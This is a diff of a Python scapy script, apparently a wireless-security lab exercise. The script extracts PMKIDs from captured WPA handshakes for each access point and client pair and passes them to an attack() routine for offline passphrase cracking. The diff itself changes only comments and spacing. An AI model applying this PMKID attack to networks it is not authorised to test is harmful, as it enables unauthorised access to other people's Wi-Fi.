@@ -43,7 +43,7 @@ def customPRF512(key,A,B):
 wpa=rdpcap("PMKID_handshake.pcap") 
 
 assocRequests = []
-# get info from first association request (ssid, APMac, ClientMAC)
+# get info from every association requests (ssid, APMac, ClientMAC)
 def getAssocReqInfo(packets):
     for p in packets:
         if p.haslayer(Dot11): 
@@ -53,14 +53,14 @@ def getAssocReqInfo(packets):
                 ar_Clientmac = p.addr2
                 assocRequests.append((ar_ssid, ar_APmac, ar_Clientmac))
 
-# get handshake messages
+# get the first handshake message for the specified AP-STA pair
 def getPMKIDFromFirstHandshakeMessage(packets, apmac, climac):
     for p in packets:
         #AP to STA (handshake#1 and handshake#3)
         if p.haslayer(WPA_key) and p.addr2 == apmac and p.addr1 ==climac:
             return getPMKIDFromPacket(p)
 
-    # Return 0 if not found in the packets
+    # Return 0 if AP-STA pair hasn't started handshake
     return 0
             
 
@@ -95,6 +95,7 @@ def main():
     getAssocReqInfo(wpa)
     for infos in assocRequests:
         pmkid = getPMKIDFromFirstHandshakeMessage(wpa, infos[1], infos[2])
+        
         if pmkid != 0:
             attack(pmkid, infos)
 
